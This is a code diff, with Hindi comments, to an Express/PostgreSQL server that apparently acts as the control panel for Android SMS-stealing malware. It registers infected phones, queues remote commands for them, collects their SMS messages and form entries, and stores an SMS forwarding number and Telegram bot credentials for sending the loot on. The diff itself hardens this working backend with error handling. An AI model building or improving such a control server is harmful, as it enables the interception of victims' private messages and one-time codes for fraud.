@@ -6,14 +6,11 @@ const cors = require('cors');
 // सर्वर और डेटाबेस का सेटअप
 const app = express();
 const PORT = process.env.PORT || 3000;
-const DATABASE_URL = process.env.DATABASE_URL;
 
-// PostgreSQL डेटाबेस से कनेक्शन
+// PostgreSQL डेटाबेस से कनेक्शन (सही तरीका)
 const pool = new Pool({
-  connectionString: DATABASE_URL,
-  ssl: {
-    rejectUnauthorized: false
-  }
+  connectionString: process.env.DATABASE_URL, // सुनिश्चित करें कि process.env से ही पढ़ें
+  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
 });
 
 // सर्वर को JSON और CORS उपयोग करने के लिए कॉन्फ़िगर करें
@@ -88,12 +85,13 @@ app.post('/api/device/register', async (req, res) => {
       );
     } else {
       await pool.query(
-        'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen) VALUES ($1, $2, $3, $4, $5, NOW())',
+        'INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES ($1, $2, $3, $4, $5, NOW(), NOW())',
         [device_id, device_name, os_version, battery_level, phone_number]
       );
     }
     res.status(200).json({ status: 'success', message: 'Device data received.' });
   } catch (err) {
+    console.error('Error in /api/device/register:', err);
     res.status(500).json({ status: 'error', message: err.message });
   }
 });
@@ -109,99 +107,162 @@ app.get('/api/devices', async (req, res) => {
     });
     res.status(200).json(devicesWithStatus);
   } catch (err) {
+    console.error('Error in /api/devices:', err);
     res.status(500).json({ status: 'error', message: err.message });
   }
 });
 
 // 3 & 4. SMS फॉरवर्डिंग नंबर को सेट करना और पाना
 app.post('/api/config/sms_forward', async (req, res) => {
-  const { forward_number } = req.body;
-  await pool.query(
-    `INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', $1)
-     ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`,
-    [forward_number]
-  );
-  res.status(200).json({ status: 'success', message: 'Forwarding number updated successfully.' });
+    try {
+        const { forward_number } = req.body;
+        await pool.query(
+            `INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', $1)
+            ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`,
+            [forward_number]
+        );
+        res.status(200).json({ status: 'success', message: 'Forwarding number updated successfully.' });
+    } catch (err) {
+        console.error('Error in POST /api/config/sms_forward:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 app.get('/api/config/sms_forward', async (req, res) => {
-  const { rows } = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'");
-  res.status(200).json({ forward_number: rows.length > 0 ? rows[0].setting_value : null });
+    try {
+        const { rows } = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'");
+        res.status(200).json({ forward_number: rows.length > 0 ? rows[0].setting_value : null });
+    } catch (err) {
+        console.error('Error in GET /api/config/sms_forward:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 // 5. टेलीग्राम फॉरवर्डिंग
 app.post('/api/config/telegram', async (req, res) => {
-    const { telegram_bot_token, telegram_chat_id } = req.body;
-    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [telegram_bot_token]);
-    await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [telegram_chat_id]);
-    res.status(200).json({ status: 'success', message: 'Telegram settings updated.' });
+    try {
+        const { telegram_bot_token, telegram_chat_id } = req.body;
+        await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_bot_token', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [telegram_bot_token]);
+        await pool.query(`INSERT INTO global_settings (setting_key, setting_value) VALUES ('telegram_chat_id', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1`, [telegram_chat_id]);
+        res.status(200).json({ status: 'success', message: 'Telegram settings updated.' });
+    } catch (err) {
+        console.error('Error in POST /api/config/telegram:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 app.get('/api/config/telegram', async (req, res) => {
-    const tokenRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'");
-    const chatRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'");
-    res.status(200).json({
-        telegram_bot_token: tokenRow.rows.length > 0 ? tokenRow.rows[0].setting_value : null,
-        telegram_chat_id: chatRow.rows.length > 0 ? chatRow.rows[0].setting_value : null
-    });
+    try {
+        const tokenRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_bot_token'");
+        const chatRow = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'telegram_chat_id'");
+        res.status(200).json({
+            telegram_bot_token: tokenRow.rows.length > 0 ? tokenRow.rows[0].setting_value : null,
+            telegram_chat_id: chatRow.rows.length > 0 ? chatRow.rows[0].setting_value : null
+        });
+    } catch (err) {
+        console.error('Error in GET /api/config/telegram:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 
 // 6. कमांड भेजना
 app.post('/api/command/send', async (req, res) => {
-  const { device_id, command_type, command_data } = req.body;
-  await pool.query(
-    'INSERT INTO commands (device_id, command_type, command_data) VALUES ($1, $2, $3)',
-    [device_id, command_type, JSON.stringify(command_data)]
-  );
-  res.status(200).json({ status: 'success', message: 'Command queued.' });
+    try {
+        const { device_id, command_type, command_data } = req.body;
+        await pool.query(
+            'INSERT INTO commands (device_id, command_type, command_data, status) VALUES ($1, $2, $3, \'pending\')',
+            [device_id, command_type, JSON.stringify(command_data)]
+        );
+        res.status(201).json({ status: 'success', message: 'Command queued.' });
+    } catch (err) {
+        console.error('Error in /api/command/send:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 // क्लाइंट के लिए पेंडिंग कमांड पाना
 app.get('/api/device/:deviceId/commands', async (req, res) => {
-    const { deviceId } = req.params;
-    const { rows } = await pool.query("SELECT * FROM commands WHERE device_id = $1 AND status = 'pending'", [deviceId]);
-    
-    // कमांड भेजने के बाद उनका स्टेटस 'sent' में बदलना
-    if (rows.length > 0) {
-        const commandIds = rows.map(cmd => cmd.id);
-        await pool.query("UPDATE commands SET status = 'sent' WHERE id = ANY($1::int[])", [commandIds]);
+    try {
+        const { deviceId } = req.params;
+        const { rows } = await pool.query("SELECT * FROM commands WHERE device_id = $1 AND status = 'pending'", [deviceId]);
+        
+        if (rows.length > 0) {
+            const commandIds = rows.map(cmd => cmd.id);
+            await pool.query("UPDATE commands SET status = 'sent' WHERE id = ANY($1::int[])", [commandIds]);
+        }
+        
+        const commandsWithParsedData = rows.map(row => {
+            try {
+                return {...row, command_data: JSON.parse(row.command_data)};
+            } catch {
+                return {...row, command_data: {}}; // JSON पार्स न होने पर खाली ऑब्जेक्ट भेजें
+            }
+        });
+        res.status(200).json(commandsWithParsedData);
+    } catch (err) {
+        console.error(`Error in GET /api/device/${req.params.deviceId}/commands:`, err);
+        res.status(500).json({ status: 'error', message: err.message });
     }
-    res.json(rows.map(row => ({...row, command_data: JSON.parse(row.command_data)})));
 });
 
 // कमांड पूरा होने पर मार्क करना
 app.post('/api/command/:commandId/execute', async (req, res) => {
-    await pool.query("UPDATE commands SET status = 'executed' WHERE id = $1", [req.params.commandId]);
-    res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
+    try {
+        await pool.query("UPDATE commands SET status = 'executed' WHERE id = $1", [req.params.commandId]);
+        res.status(200).json({ status: 'success', message: 'Command marked as executed.' });
+    } catch (err) {
+        console.error(`Error in /api/command/${req.params.commandId}/execute:`, err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 
 // 7. फॉर्म सबमिशन
 app.post('/api/device/:deviceId/forms', async (req, res) => {
-    await pool.query('INSERT INTO form_submissions (device_id, custom_data) VALUES ($1, $2)', [req.params.deviceId, req.body.custom_data]);
-    res.status(200).json({ status: 'success', message: 'Form data received.' });
+    try {
+        await pool.query('INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES ($1, $2, NOW())', [req.params.deviceId, req.body.custom_data]);
+        res.status(201).json({ status: 'success', message: 'Form data received.' });
+    } catch (err) {
+        console.error('Error in /api/device/.../forms:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 // 8. SMS लॉग्स
 app.post('/api/device/:deviceId/sms', async (req, res) => {
-    await pool.query('INSERT INTO sms_logs (device_id, sender, message_body) VALUES ($1, $2, $3)', [req.params.deviceId, req.body.sender, req.body.message_body]);
-    res.status(200).json({ status: 'success', message: 'SMS logged.' });
+    try {
+        await pool.query('INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES ($1, $2, $3, NOW())', [req.params.deviceId, req.body.sender, req.body.message_body]);
+        res.status(201).json({ status: 'success', message: 'SMS logged.' });
+    } catch (err) {
+        console.error('Error in /api/device/.../sms:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 // 9. डिवाइस डिलीट करना
 app.delete('/api/device/:deviceId', async (req, res) => {
-    const { deviceId } = req.params;
-    await pool.query('DELETE FROM sms_logs WHERE device_id = $1', [deviceId]);
-    await pool.query('DELETE FROM form_submissions WHERE device_id = $1', [deviceId]);
-    await pool.query('DELETE FROM devices WHERE device_id = $1', [deviceId]);
-    res.status(200).json({ status: 'success', message: 'Device and related data deleted.' });
+    try {
+        const { deviceId } = req.params;
+        await pool.query('DELETE FROM sms_logs WHERE device_id = $1', [deviceId]);
+        await pool.query('DELETE FROM form_submissions WHERE device_id = $1', [deviceId]);
+        await pool.query('DELETE FROM devices WHERE device_id = $1', [deviceId]);
+        res.status(200).json({ status: 'success', message: 'Device and related data deleted.' });
+    } catch (err) {
+        console.error('Error in DELETE /api/device/...:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 // 10. SMS डिलीट करना
 app.delete('/api/sms/:smsId', async (req, res) => {
-    await pool.query('DELETE FROM sms_logs WHERE id = $1', [req.params.smsId]);
-    res.status(200).json({ status: 'success', message: 'SMS deleted.' });
+    try {
+        await pool.query('DELETE FROM sms_logs WHERE id = $1', [req.params.smsId]);
+        res.status(200).json({ status: 'success', message: 'SMS deleted.' });
+    } catch (err) {
+        console.error('Error in DELETE /api/sms/...:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
 });
 
 // फ्रंटएंड पर दिखाने के लिए एक रूट
@@ -212,9 +273,11 @@ app.get('/', (req, res) => {
 // सर्वर को शुरू करना
 app.listen(PORT, async () => {
   try {
+    await pool.query('SELECT NOW()'); // डेटाबेस कनेक्शन की जांच करें
+    console.log('Database connected successfully.');
     await createTables();
-    console.log(`Server is running on port ${PORT}`);
+    console.log(`Server is running on http://localhost:${PORT}`);
   } catch (err) {
-    console.error('Failed to initialize database:', err);
+    console.error('Failed to start server:', err);
   }
 });
